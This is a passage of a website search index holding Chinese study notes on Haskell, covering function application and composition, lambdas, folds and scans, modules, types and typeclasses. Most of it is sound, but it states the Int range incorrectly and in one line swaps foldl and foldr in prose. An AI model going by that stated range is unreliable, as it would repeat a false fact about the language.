\u5b83\u53ef\u4ee5\u6539\u53d8\u51fd\u6570\u7ed3\u5408\u4f18\u5148\u7ea7\uff0c\u5c06\u5de6\u4fa7\u51fd\u6570\u5e94\u7528\u4e8e\u5168\u90e8\u53f3\u4fa7\u5185\u5bb9\u4e0a\uff0c\u76f8\u5f53\u4e8e\u7ed9\u53f3\u4fa7\u6574\u4f53\u52a0\u4e0a\u4e86\u62ec\u53f7\u3002\u5426\u5219\u51fd\u6570\u9ed8\u8ba4\u5de6\u7ed3\u5408\uff0c\u4f1a\u4f9d\u6b21\u5411\u53f3\u5e94\u7528\u800c\u4e0d\u4f1a\u5e94\u7528\u5728\u6574\u4f53\u4e0a\u3002 f $ g x -- \u7b49\u4ef7\u4e8e f ( g x ) ----- f g x -- \u7b49\u4ef7\u4e8e ( f g ) x","title":"Function application"},{"location":"cs/pl/haskell/#function-composition","text":"\u51fd\u6570\u590d\u5408\u53ef\u4ee5\u4f7f\u7528 . \uff0c . \u4e5f\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u662f\uff1a (.) :: (b -> c) -> (a -> b) -> a -> c \u5b9a\u4e49\u662f\uff1a f . g = \\x -> f (g x) \u4f46\u662f\u51fd\u6570\u590d\u5408\u7684\u4f18\u5148\u7ea7\u8981\u6bd4\u51fd\u6570\u6267\u884c\u4f4e\uff0c\u6bd4\u5982\uff1a sum . replicate 5 . max 6.7 8.9 \u4f1a\u5148\u6267\u884c max 6.7 8.9 \u5e76\u8fd4\u56de 8.9\uff0c\u7136\u540e\u5c06 sum\u3001replicate 5\u30018.9 \u590d\u5408\uff0c\u4f46\u4e24\u4e2a\u51fd\u6570\u65e0\u6cd5\u548c\u4e00\u4e2a\u503c (8.9) \u590d\u5408\uff0c\u6240\u4ee5\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u56e0\u6b64\u8981\u4f7f\u7528 $ \u6765\u89c4\u5b9a\u5148\u590d\u5408\u518d\u6267\u884c\uff1a sum . replicate 5 . max 6.7 $ 8.9","title":"Function Composition"},{"location":"cs/pl/haskell/#lambda","text":"Haskell \u8bed\u8a00\u4e2d\u7684 lambda \u8868\u8fbe\u5f0f\u662f\u7528 \\ \u6765\u8868\u793a\u7684\uff08\u56e0\u4e3a\u770b\u7740\u50cf \\(\\mathtt{\\lambda}\\) \uff1f\uff09 \u5177\u4f53\u8bed\u6cd5\u662f \\ para1 para2 ... -> return \"->\" \u524d\u7684 para1 para2 ... \u662f\u4f20\u5165\u53c2\u6570\uff0c\u5355\u4e2a\u591a\u4e2a\u90fd\u53ef\u4ee5\uff0c\u9700\u8981\u7528\u7a7a\u683c\u9694\u5f00\uff1b\"->\" \u540e\u7684 return \u662f\u8ba1\u7b97\u5f97\u5230\u7684\u8fd4\u56de\u503c\u3002\u4e00\u822c\u9700\u8981\u7528\u62ec\u53f7\u5c06\u6574\u4e2a\u8868\u8fbe\u5f0f\u62ec\u8d77\u6765\uff0c\u9632\u6b62\u8fd4\u56de\u503c\u90e8\u5206\u4e00\u76f4\u5411\u53f3\u5ef6\u4f38\u3002","title":"lambda"},{"location":"cs/pl/haskell/#foldscan","text":"fold \u548c scan \u90fd\u63a5\u6536\u4e09\u4e2a\u53c2\u6570\uff08\u4e00\u4e2a\u4e8c\u5143\u51fd\u6570\uff0c\u4e00\u4e2a\u521d\u59cb\u503c accumulator\uff0c\u4e00\u4e2a\u8981\u6298\u53e0\u7684\u5217\u8868\uff09\uff0cfold \u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u800c scan \u8fd4\u56de\u4e00\u4e2a\u5217\u8868 \u4f20\u5165\u7684\u4e8c\u5143\u51fd\u6570 f :: a -> b -> b \u5c06 accumulator \u548c\u4ece\u5217\u8868\u4e2d\u53d6\u51fa\u7684\u503c\u4e00\u540c\u4f20\u5165\uff08l \u5219 accumulator \u5728\u5de6\u8fb9\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0cr \u5219 accumulator \u5728\u53f3\u8fb9\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff09","title":"fold\u548cscan"},{"location":"cs/pl/haskell/#foldl","text":"\u5de6\u6298\u53e0\uff0c\u6bcf\u6b21\u4ece\u5217\u8868\u6700\u5de6\u4fa7\u53d6\u51fa\u4e00\u4e2a\u503c\uff0c\u548c accumulator \u4e00\u8d77\u4f20\u5165\u4e8c\u5143\u51fd\u6570\uff0c\u5e76\u4e14 accumulator \u5728\u5de6\u8fb9\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u5982\uff1a foldl f a xs \u5b83\u7684\u7ed3\u679c\u8ba1\u7b97\u8fc7\u7a0b\u4e3a > foldl f a [ x1 , x2 , x3 ] [ 1 . ] a = f a x1 [ 2 . ] a = f a x2 = f ( f a x1 ) x2 [ 3 . ] a = f a x3 = f ( f ( f a x1 ) x2 ) x3 \u53ef\u4ee5\u770b\u51fa f (f a x1) x2 \u5176\u5b9e\u5c31\u662f foldl f a [x1, x2] \u800c\u4e14\u56e0\u6b64\uff0cfoldl \u5728\u8ba1\u7b97\u65f6\u6700\u5916\u5c42\u9700\u8981\u627e\u5230 x3\uff0c\u8fd9\u6837\u5982\u679c xs \u662f\u4e00\u4e2a\u65e0\u7a77\u5217\u8868\uff0c\u90a3\u4e48\u5c06\u65e0\u6cd5\u8ba1\u7b97\uff0c\u9677\u5165\u65e0\u7a77\u3002\u6240\u4ee5 foldl \u867d\u7136\u770b\u8d77\u6765\u4ece\u5de6\u8fb9\u53d6\u503c\uff0c\u4f46\u662f\u51fd\u6570\u9700\u8981\u4ece\u53f3\u4fa7\u5c55\u5f00\uff0c\u5e76\u4e0d\u9002\u7528\u4e8e\u65e0\u7a77\u5217\u8868","title":"foldl"},{"location":"cs/pl/haskell/#foldr","text":"\u53f3\u6298\u53e0\uff0c\u6bcf\u6b21\u4ece\u5217\u8868\u6700\u53f3\u4fa7\u53d6\u51fa\u4e00\u4e2a\u503c\uff0c\u548c accumulator \u4e00\u8d77\u4f20\u5165\u4e8c\u5143\u51fd\u6570\uff0c\u5e76\u4e14 accumulator \u5728\u53f3\u8fb9\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5982\uff1a foldr f a xs \u5b83\u7684\u7ed3\u679c\u8ba1\u7b97\u8fc7\u7a0b\u4e3a > foldr f a [ x1 , x2 , x3 ] [ 1 . ] a = f x3 a [ 2 . ] a = f x2 a = f x2 ( f x3 a ) [ 3 . ] a = f x1 a = f x1 ( f x2 ( f x3 a )) \u4ece\u4e2d\u53ef\u4ee5\u770b\u51fa f x2 (f x3 a) \u5c31\u662f foldr f a [x2, x3] \u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u9012\u5f52\u6765\u5199\u4e00\u4e2a\u548c foldr \u6548\u679c\u4e00\u6837\u7684\u51fd\u6570: foldr' :: ( a -> b -> b ) -> b -> [ a ] -> b foldr' _ x [] = x foldr' f a ( x : xs ) = f x ( foldr' f a xs ) \u4e5f\u53ef\u4ee5\u770b\u51fa\uff0c\u6700\u5916\u5c42\u8ba1\u7b97\u65f6\u53ea\u9700\u8981 x1 \u5e76\u4e14\u5411\u4e0b\u9012\u5f52\uff0c\u5e76\u4e0d\u4f1a\u63a5\u89e6\u5230\u5217\u8868\u672b\u5c3e\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u4e8e\u65e0\u7a77\u5217\u8868\u3002foldr \u5373\u4f7f\u770b\u4e0a\u53bb\u4ece\u53f3\u8fb9\u53d6\u503c\uff0c\u4f46\u662f\u8981\u4ece\u5de6\u5f00\u59cb\u5c55\u5f00\uff0c\u53ef\u4ee5\u7528\u4e8e\u65e0\u7a77\u5217\u8868 \u4f8b\u5982\uff1a ghci > foldr ( || ) False ( repeat True ) True -- \u7531\u4e8e\u903b\u8f91\u8fd0\u7b97\u5b58\u5728\u77ed\u8def\uff0c\u8ba1\u7b97\u503c\u5168\u5e94\u4e3aTrue\uff0c\u6240\u4ee5\u76f4\u63a5\u8fd4\u56de\u4e86 ghci > foldl ( || ) False ( repeat True ) -- \u8fd9\u91cc\u4ec0\u4e48\u90fd\u4e0d\u4f1a\u53d1\u751f\uff0c\u76f4\u5230\u7535\u8111\u5185\u5b58\u88ab\u7206\u6389 -- \u56e0\u4e3a\u51fd\u6570\u521a\u5f00\u59cb\u5c31\u9700\u8981\u5217\u8868\u6700\u53f3\u4fa7\u7684\u503c\uff0c\u6240\u4ee5\u5728\u4e0d\u65ad\u8ba1\u7b97\u8fd9\u4e2a\u65e0\u7a77\u5217\u8868","title":"foldr"},{"location":"cs/pl/haskell/#scanl-scanr","text":"scan \u7c7b\u4f3c fold\uff0c\u53ea\u662f\u5c06\u4e2d\u95f4\u5f97\u5230\u7684\u6bcf\u4e00\u4e2a\u503c\u90fd\u6dfb\u52a0\u8fdb\u4e00\u4e2a\u5217\u8868\u4e2d\u5e76\u8fd4\u56de\u8fd9\u4e2a\u5217\u8868 scanl \u5219\u5411\u53f3\u5ef6\u4f38\u8fd9\u4e2a\u5217\u8868\uff0cscanr \u5219\u5411\u5de6\u5ef6\u4f38\u8fd9\u4e2a\u5217\u8868 \u4f46\u662f\u5b83\u548c fold \u6070\u6070\u76f8\u53cd\uff0cscanl \u80fd\u7528\u4e8e\u65e0\u7a77\u5217\u8868\uff0c\u800c scanr \u4e0d\u80fd > scanr f a [ x1 , x2 , x3 ] [ 1 . ] \u6700\u53f3\u4fa7\u5143\u7d20 ( - 1 in python ) : a [ 2 . ] \u53f3\u4fa7\u7b2c\u4e8c\u4e2a\u5143\u7d20 ( - 2 ) : f x3 a [ 3 . ] \u53f3\u4fa7\u7b2c\u4e09\u4e2a\u5143\u7d20 ( - 3 ) : f x2 ( f x3 a ) [ 4 . ] \u53f3\u4fa7\u7b2c\u56db\u4e2a\u5143\u7d20 ( - 4 ) : f x1 ( f x2 ( f x3 a )) \u53ef\u4ee5\u770b\u51fa f x2 (f x3 a) \u662f foldr f a [x2, x3]\uff0c\u4e5f\u662f scanr f a [x2, x3] \u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 \u56e0\u6b64\u53ef\u4ee5\u7528\u9012\u5f52\u6765\u5199\u4e00\u4e2a\u548c scanr \u6548\u679c\u4e00\u6837\u7684\u51fd\u6570\uff1a scanr' :: ( a -> b -> b ) -> b -> [ a ] -> [ b ] scanr' _ x [] = [ x ] -- scanr' f a (x:xs) = f x (foldr f a xs) : scanr' f a xs scanr' f a ( x : xs ) = f x q : qs where qs @ ( q : _ ) = scanr' f a xs scanl \u4e5f\u662f\u540c\u7406\uff1a scanl' :: ( b -> a -> b ) -> b -> [ a ] -> [ b ] scanl' _ x [] = [ x ] scanl' f a ( x : xs ) = a : scanl' f ( f a x ) xs \u4e5f\u53ef\u4ee5\u770b\u51fa\uff0cscanr \u8fd4\u56de\u7684\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u6700\u540e\u6dfb\u52a0\u8fdb\u53bb\u7684\uff0c\u6240\u4ee5\u5b83\u65e0\u6cd5\u7528\u4e8e\u65e0\u7a77\u5217\u8868\u3002\u800c scanl \u8fd4\u56de\u7684\u5217\u8868\u4e2d\u7684\u5143\u7d20\u662f\u4ece\u5de6\u5230\u53f3\u4f9d\u6b21\u6dfb\u52a0\uff0c\u53ef\u4ee5\u7528\u4e8e\u65e0\u7a77\u5217\u8868\u622a\u53d6\u524d\u4e00\u90e8\u5206\u7ed3\u679c\uff1a ghci > take 10 ( scanl ( + ) 0 [ 1 .. ]) [ 0 , 1 , 3 , 6 , 10 , 15 , 21 , 28 , 36 , 45 ] ghci > take 10 ( scanr ( + ) 0 [ 1 .. ]) [ *** Exception: stack overflow","title":"scanl \u548c scanr"},{"location":"cs/pl/haskell/#foldr-foldl","text":"pdcxs \u8fd8\u7ed9\u6211\u4ecb\u7ecd\u4e86\u4e00\u4e2a\u795e\u5947\u7684\u64cd\u4f5c\uff0c\u7528 foldl \u6765\u5b9a\u4e49 foldr\uff1a foldl' f z xs = foldr ( \\ x g y -> g ( f y x )) id xs z \u5b83\u5229\u7528 foldr (\\x g y -> g (f y x)) id xs \u751f\u6210\u4e00\u4e2a\u51fd\u6570\uff0c\u4f5c\u7528\u4e8ez\u5f97\u5230\u7ed3\u679c\u3002 \u5148\u6765\u770b\u4e00\u4e0b foldr \u7684\u7c7b\u578b\uff1a foldr :: Foldable t => ( a -> b -> b ) -> b -> t a -> b -- \u53ef\u4ee5\u770b\u6210 (a -> b -> b) -> b -> [a] -> b \u4f46\u662f\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u7c7b\u578b b \u5e76\u4e0d\u662f\u4e00\u4e2a\u6570\u5b57\uff0c\u800c\u662f\u4e00\u4e2a\u51fd\u6570 (b -> b)\u3002 \u6240\u4ee5\u8fd9\u91cc foldr \u7684\u7c7b\u578b\u53ef\u4ee5\u5199\u6210\uff1a (a -> (b -> b) -> (b -> b)) -> (b -> b) -> [a] -> (b -> b) \u5bf9\u5e94\u4e8e\u7528\u6cd5 foldr (\\x g y -> g (f y x)) id xs \uff0c\u5b83\u8fd4\u56de\u7684\u503c\u5e94\u8be5\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u7c7b\u578b\u4e3a b -> b\uff08\u540e\u9762\u8981\u4f5c\u7528\u4e8ez\uff09 \u800c xs \u5bf9\u5e94\u4e8e [a]\uff1bid \u5bf9\u5e94\u4e8e (b -> b) \u6240\u4ee5 (\\x g y -> g (f y x)) \u8981\u5bf9\u5e94\u4e8e\uff1a (a -> (b -> b) -> (b -> b)) \u56e0\u6b64\u53ef\u4ee5\u63a8\u65ad\u51fa x \u7684\u7c7b\u578b\u662f a\uff1by \u7684\u7c7b\u578b\u662f b\uff1b\u800c\u8fd4\u56de\u7684\u503c\u4e3a\u4e00\u4e2a\u7c7b\u578b\u4e3a (b -> b) \u7684\u51fd\u6570\u3002 \u518d\u770b\uff0c\u8fd4\u56de\u7684\u503c\u662f g (f y x) \uff0c\u5176\u4e2d f y x \u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u503c\uff0c\u7c7b\u578b\u4e3a b \u6240\u4ee5 g \u63a5\u6536\u4e00\u4e2a\u7c7b\u578b b\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b b -> b\u3002\u5373 g \u7684\u7c7b\u578b\u4e3a\uff1a b -> (b -> b) \u73b0\u5728\u6839\u636e foldr \u7684\u5b9a\u4e49\uff1a foldr f a (x:xs) = f x (foldr f a xs) \u5e26\u5165\u8ba1\u7b97\u4e00\u4e0b\uff1a xs \u5373\u4e3a [x1..xn]\uff0c\u4e3a\u4e86\u65b9\u4fbf\uff0c\u7528 xs' \u6765\u8868\u793a [x2..xn]\uff0c\u7528 xs'' \u6765\u8868\u793a [x3..xn] \u5b9a\u4e49\u4e2d\u7684 f \u5373\u4e3a (\\x g y -> g (f y x))\uff0ca \u5373\u4e3a id foldr ( \\ x g y -> g ( f y x )) id xs z = ( \\ x g y -> g ( f y x )) x1 ( foldr ( ... ) id xs' ) z \u5199\u5b8c\u7b2c\u4e00\u6b65\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0cx1 (foldr (...) id xs') z \u6b63\u597d\u5206\u522b\u5bf9\u5e94\u4e86 lambda \u8868\u8fbe\u5f0f\u4e2d\u7684 x\u3001g\u3001y\u3002\u53ef\u4ee5\u5c06\u5176\u5e94\u7528\uff0c\u8fdb\u4e00\u6b65\u5c55\u5f00\uff1a ( \\ x g y -> g ( f y x )) x1 ( foldr ( ... ) id xs' ) z = ( foldr ( ... ) id xs' ) ( f z x1 ) \u4e0d\u96be\u53d1\u73b0\uff0c\u539f\u5f0f (foldr (...) id xs) z \u7b49\u4ef7\u4e8e\uff1a (foldr (...) id xs') (f z x1) \u8ddf\u7740\u8fd9\u4e2a\u601d\u8def\uff0cxs \u6bcf\u6b21\u5c11\u4e00\u4e2a\u5f00\u5934\u7684\u5143\u7d20 x'\uff0cz \u6bcf\u6b21\u53d8\u6362\u6210\u4e3a f z x' \u56e0\u6b64\u4e0b\u4e00\u6b65\uff1a ( \\ x g y -> g ( f y x )) x1 ( foldr ( ... ) id xs' ) z = ( foldr ( ... ) id xs' ) ( f z x1 ) = ( foldr ( ... ) id xs'' ) ( f ( f z x1 ) x2 ) = ( foldr ( ... ) id xs''' ) ( f ( f ( f z x1 ) x2 ) x3 ) = ... \u53ef\u4ee5\u53d1\u73b0\uff0c\u5df2\u7ecf\u6709\u4e86\u89c4\u5f8b\u3002\u90a3\u4e48\u6700\u7ec8\u505c\u6b62\u65f6\u662f\u4ec0\u4e48\u6837\u5462\uff1f \u6700\u540e\u5230\u4e86\u4e0d\u80fd\u5728\u5c55\u5f00\u65f6\uff0c\u6700\u524d\u9762\u7684 foldr (...) id xs \u5df2\u7ecf\u53d8\u6210\u4e86 foldr (...) id [] \u800c\u6839\u636e\u524d\u9762 foldr \u7684\u5b9a\u4e49 foldr _ x [] = x \uff0c\u5b83\u5e94\u8be5\u8fd4\u56de id \u6240\u4ee5\u6700\u540e\u7684\u7ed3\u679c\uff1a (id \u7684\u5b9a\u4e49\uff1aid x = x) ... = ( foldr ( ... ) id xs' ) ( f z x1 ) = ( foldr ( ... ) id xs'' ) ( f ( f z x1 ) x2 ) = ... = ( foldr ( ... ) id [] ) ( f ( .. ( f z x1 ) .. ) xn ) = id ( f ( .. ( f z x1 ) .. ) xn ) = f ( .. ( f z x1 ) .. ) xn \u90a3\u4e48\u6700\u540e\u8fd9\u4e2a\u7ed3\u679c\u5c31\u5f88\u719f\u6089\u4e86\uff0c\u5b83\u5c31\u662f foldl f z xs\u3002 \u6240\u4ee5\u6211\u4eec\u63a8\u5bfc\u51fa\u4e86\u8fd9\u4e2a\u7528 foldr \u8868\u793a foldl \u7684\u5199\u6cd5\u662f\u6b63\u786e\u7684\u3002","title":"\u4f7f\u7528 foldr \u7f16\u5199 foldl"},{"location":"cs/pl/haskell/#modules","text":"Haskell \u4f1a\u81ea\u52a8\u52a0\u8f7d Prelude \u6a21\u5757\uff08module\uff09\uff0c\u5982\u679c\u5728 GHCi \u4e2d\u518d\u52a0\u8f7d\u5176\u4ed6\u6a21\u5757\uff0c\u9700\u8981\u4f7f\u7528 :m + ... \uff0c\u6bd4\u5982\u52a0\u8f7d Data.List \u6a21\u5757\uff1a Prelude> :m + Data.List \u800c\u5728 hs \u6587\u4ef6\u4e2d\u5f15\u5165\u6a21\u5757\uff0c\u9700\u8981\u4f7f\u7528 import \u8bed\u53e5\uff0c\u4e0b\u9762\u548c python \u7684\u5bf9\u6bd4\u53ef\u4ee5\u4fbf\u4e8e\u7406\u89e3\uff1a import Data.List -- from Data.List import * import Data.List ( nub , sort ) -- from Data.List import nub, sort import Data.List hiding ( nub ) -- \u4eceData.List\u4e2d\u5f15\u5165\u6240\u6709\uff0c\u4f46\u4e0d\u5f15\u5165nub\u51fd\u6570 import qualified Data.List -- import Data.List import qualified Data.List as Li -- import Data.List as Li","title":"Modules"},{"location":"cs/pl/haskell/#modules_1","text":"\u6a21\u5757\u4e2d\u8981\u5305\u542b\u5c06\u8981\u4f7f\u7528\u7684\u4e00\u4e9b\u51fd\u6570\uff0c\u50cf\u6b63\u5e38\u7684 hs \u6587\u4ef6\u4e00\u6837\u5199\u5373\u53ef\uff0c\u4f46\u5934\u90e8\u9700\u8981\u6709\u5bfc\u51fa\u8bed\u53e5\uff08export\uff09\u3002\u6bd4\u5982\u4e00\u4e2a\u6a21\u5757\u6587\u4ef6\u540d\u53eb ModuleA.hs \uff0c\u90a3\u5b83\u7684\u5934\u90e8\u9700\u8981\u5199\uff1a module ModuleA ( functionA , functionB , functionC ) where \u800c\u4e14\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u51fd\u6570\u53ea\u5bfc\u51fa\u9700\u8981\u4f7f\u7528\u7684\u5373\u53ef\u3002\u6bd4\u5982\u8be5\u6587\u4ef6\u4e2d\u8fd8\u542b\u6709 functionD \u4f9b\u524d\u4e09\u4e2a\u51fd\u6570\u5185\u90e8\u4f7f\u7528\uff0c\u90a3\u4e48\u5728 import ModuleA \u4e4b\u540e\u4e5f\u65e0\u6cd5\u8c03\u7528 functionD\u3002","title":"\u7f16\u5199 Modules"},{"location":"cs/pl/haskell/#types-typeclasses","text":"","title":"Types &amp; Typeclasses"},{"location":"cs/pl/haskell/#types","text":"Haskell \u6709\u4e00\u4e2a\u9759\u6001\u7c7b\u578b\u7cfb\u7edf\uff0c\u4efb\u4f55\u53d8\u91cf\u3001\u51fd\u6570\u90fd\u4f1a\u5177\u6709\u7c7b\u578b\uff0c\u5e76\u4e14\u6709\u7c7b\u578b\u5224\u65ad\u529f\u80fd\uff0c\u6ca1\u7ed9\u51fa\u7684\u7c7b\u578b\u4f1a\u81ea\u52a8\u8bc6\u522b\u3002 Type \u7684\u9996\u5b57\u6bcd\u5168\u4e3a\u5927\u5199\uff0c\u5e38\u7528\u7684\u6709\uff1a Int \uff1a\u6574\u578b\uff0c\u6709\u4e0a\u4e0b\u754c\u8303\u56f4\uff0c-2147483647\uff5e2147483648 Integer \uff1a\u6574\u6570\uff0c\u65e0\u754c\uff0c\u4f46\u662f\u6548\u7387\u6bd4Int\u4f4e Float \uff1a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b Double \uff1a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b Bool \uff1a\u5e03\u5c14\u503c Char \uff1a\u5b57\u7b26 String \uff1a\u5b57\u7b26\u4e32\uff0c\u7b49\u540c\u4e8e [Char] Ordering \uff1a\u5927\u5c0f\u5173\u7cfb\uff0c\u5305\u542bLT\u3001EQ\u3001GT\uff0c\u4e14\u5b83\u4eec\u6709\u5927\u5c0f\u5173\u7cfb LT < EQ < GT \u5217\u8868\u7684\u7c7b\u578b\u662f\u7531\u5176\u4e2d\u5143\u7d20\u51b3\u5b9a\u7684\uff0c\u5e76\u4e14\u5217\u8868\u4e2d\u5143\u7d20\u5fc5\u987b\u662f\u540c\u4e00\u7c7b\u578b\uff0c\u6240\u4ee5\u5217\u8868\u7684\u7c7b\u578b\u5c31\u662f\u5176\u5143\u7d20\u7c7b\u578b\u5916\u52a0 [] \u3002 \u5143\u7ec4\u7684\u7c7b\u578b\u7531\u5176\u4e2d\u5404\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u5171\u540c\u51b3\u5b9a\uff0c\u56e0\u4e3a\u5143\u7ec4\u4e2d\u7684\u5143\u7d20\u53ef\u4ee5\u662f\u4e0d\u540c\u7c7b\u578b\u3002\u5982 (\"abc\", 'a', True) \u7684\u7c7b\u578b\u662f ([Char], Char, Bool)\u3002","title":"Types"},{"location":"cs/pl/haskell/#typeclasses","text":"\u7c7b\u578b\u7c7b\uff08Typeclass\uff09\u662f\u5b9a\u4e49\u4e00\u7cfb\u5217\u529f\u80fd\u7684\u63a5\u53e3\uff0c\u5982\u679c\u4e00\u4e2a Type \u5c5e\u4e8e\u4e00\u4e2a Typeclass \u7684\u6210\u5458\uff0c\u90a3\u4e48\u5b83\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e2a\u7c7b\u578b\u7c7b\u6240\u89c4\u5b9a\u7684\u529f\u80fd\u3002\u4e00\u4e2a Type \u4e5f\u53ef\u4ee5\u5c5e\u4e8e\u591a\u4e2aTypeclass Typeclass\u7684\u9996\u5b57\u6bcd\u4e5f\u5168\u4e3a\u5927\u5199\uff0c\u5e38\u89c1\u7684\u6709\uff1a Eq \uff1a\u53ef\u5224\u65ad\u662f\u5426\u76f8\u7b49 Ord \uff1a\u53ef\u6bd4\u8f83\u5927\u5c0f Show \uff1a\u53ef\u5c55\u793a\u6210\u5b57\u7b26\u4e32 Read \uff1a\u53ef\u4ece\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u7279\u5b9a\u7c7b\u578b Enum \uff1a\u53ef\u679a\u4e3e\uff08\u8fde\u7eed\uff09\uff0c\u5373\u53ef\u4ee5\u4f7f\u7528 pred \u548c succ \u51fd\u6570\u5f97\u5230\u524d\u9a71\u548c\u540e\u7f00 Bounded : \u6709\u4e0a\u4e0b\u754c\uff0c\u5982\u679c\u5143\u7ec4\u4e2d\u6240\u6709\u5143\u7d20\u90fd\u5c5e\u4e8e Bounded\uff0c\u90a3\u8fd9\u4e2a\u5143\u7ec4\u7684\u7c7b\u578b\u4e5f\u5c5e\u4e8e Bounded Integral \uff1a\u662f\u6574\u6570\uff0c\u5305\u62ec Int \u548c Integer RealFloat \uff1a \u662f\u5b9e\u6d6e\u70b9\u6570\uff0c\u5305\u62ec Float \u548c Double RealFrac \uff1a\u662f\u5b9e\u5206\u6570\uff0c\u5305\u62ec Float\u3001Double \u548c Ratio\uff08\u5728 Data.Ratio \u6a21\u5757\u4e2d\uff09 Floating \uff1a\u662f\u6d6e\u70b9\u6570\uff0c\u5305\u62ec Float\u3001Double \u548c Complex\uff08\u5728 Data.Complex \u6a21\u5757\u4e2d\uff09 Real \uff1a\u662f\u5b9e\u6570\uff0c\u5305\u62ec Integral \u548c RealFrac \u7684\u6210\u5458 Fractional \uff1a\u662f\u5206\u6570\uff0c\u5305\u62ec RealFrac \u548c Floating \u7684\u6210\u5458 Num \uff1a\u662f\u6570\u5b57\uff0c\u5305\u62ec\u4e0a\u8ff0\u6240\u6709\u6570\u5b57\u76f8\u5173\u7684\u7c7b\u578b","title":"Typeclasses"},{"location":"cs/pl/haskell/#type-variables","text":"\u5982\u679c\u67e5\u770b\u4e00\u4e2a\u51fd\u6570\u7684\u7c7b\u578b\uff0c\u6bd4\u5982 head \uff0c\u90a3\u4e48\u5c06\u4f1a\u8fd4\u56de\u4ee5\u4e0b\u7c7b\u578b\uff1a head :: [a] -> a \u5176\u4e2d\u7684 a \u5c31\u662f\u4e00\u4e2a\u7c7b\u578b\u53d8\u91cf\uff08type variable\uff09\uff0c\u5b83\u5728 head \u4e2d\u53ef\u4ee5\u5c5e\u4e8e\u4efb\u4f55\u7c7b\u578b\uff0c\u5728\u8fd9\u91cc\u53ea\u662f\u8868\u793a\u8fd4\u56de\u503c\u7684\u7c7b\u578b\u548c\u8f93\u5165\u7684\u5217\u8868\u4e2d\u7684\u5143\u7d20\u7684\u7c7b\u578b\u76f8\u4e00\u81f4\u3002 \u5728\u51fd\u6570\u7684\u7c7b\u578b\u8868\u8fbe\u5f0f\u5176\u5b9e\u53ef\u4ee5\u770b\u4f5c \\(\\lambda\\) \u8868\u8fbe\u5f0f\uff0c\u5b83\u9002\u7528\u4e8e \\(\\alpha\\) \u53d8\u6362\uff08 \\(\\alpha\\) -conversion\uff09\u3002\u5373 a \u5728\u8fd9\u91cc\u53ef\u4ee5\u6307 Int\u3001Char \u7b49\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u6307 [Char], (Int, Char), \u751a\u81f3\u51fd\u6570 Int -> Int \u7b49\u3002 \u5728\u5927\u90e8\u5206\u51fd\u6570\u7684\u7c7b\u578b\u4e2d\uff0c\u7c7b\u578b\u53d8\u91cf\u9700\u8981\u4fdd\u8bc1\u662f\u67d0\u4e2a Typeclass \u7684\u6210\u5458\u624d\u80fd\u5b8c\u6210\u64cd\u4f5c\u3002\u6bd4\u5982 (==) \u51fd\u6570\uff0c\u5b83\u9700\u8981\u4f20\u5165\u7684\u53c2\u6570\u662f\u53ef\u5224\u65ad\u76f8\u7b49\u7684\uff0c\u5373\u662f Eq \u7684\u6210\u5458\uff0c\u90a3\u4e48 (==) \u7684\u7c7b\u578b\u5c31\u662f\uff1a (==) :: (Eq a) => a -> a -> Bool \u5176\u4e2d => \u524d\u7684\u90e8\u5206 (Eq a) \u5c31\u662f\u7c7b\u7ea6\u675f\uff08class constraint\uff09\uff0c\u5b83\u89c4\u5b9a\u4e86 a \u662f Eq \u7684\u6210\u5458\uff0c\u6240\u4ee5 (==) \u51fd\u6570\u4f20\u5165\u7684\u4e24\u4e2a\u53c2\u6570\u90fd\u662f a \u7c7b\u578b\uff0c\u4e14\u90fd\u662f Eq \u7684\u6210\u5458\uff0c\u4fdd\u8bc1\u4e86\u5b83\u4eec\u4e4b\u95f4\u662f\u53ef\u4ee5\u6bd4\u8f83\u662f\u5426\u76f8\u7b49\u7684\u3002","title":"Type variables"},{"location":"cs/pl/haskell/#type","text":"\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684 Type \u9700\u8981\u4f7f\u7528 data \u5173\u952e\u5b57\uff0c\u6bd4\u5982\u5b9a\u4e49 Bool \u9700\u8981\u4f7f\u7528\uff1a data Bool = False | True \u5176\u4e2d = \u5de6\u4fa7\u7684\u90e8\u5206\u5b9a\u4e49\u4e86\u65b0\u7c7b\u578b\u7684\u540d\u79f0 Bool \uff0c\u53f3\u4fa7\u7684\u90e8\u5206\u53eb\u505a\u503c\u6784\u9020\u5668\uff08value constructors\uff09\uff0c\u8868\u793a\u4e86 Bool \u7c7b\u578b\u7684\u503c\u4e3a False \u6216 True\u3002 \u5e76\u4e14\u540d\u79f0\u548c\u503c\u6784\u9020\u5668\u7684\u9996\u5b57\u6bcd\u90fd\u9700\u8981\u5927\u5199\u3002 \u53e6\u5916\uff0c\u503c\u6784\u9020\u5668\u4e5f\u662f\u51fd\u6570\uff0c\u5b83\u4eec\u53ef\u4ee5\u6709\u53c2\u6570\uff0c\u53eb\u505a\u9879\uff08field\uff09\u3002\u6bd4\u5982\uff1a data Shape = Circle Float Float Float | Rectangle Float Float Float Float \u5b83\u5b9a\u4e49\u4e86\u4e00\u4e2a\u65b0 Type \u53eb Shape\uff0c\u503c\u6784\u9020\u5668\u662f Circle \u548c Rectangle\uff0cCircle 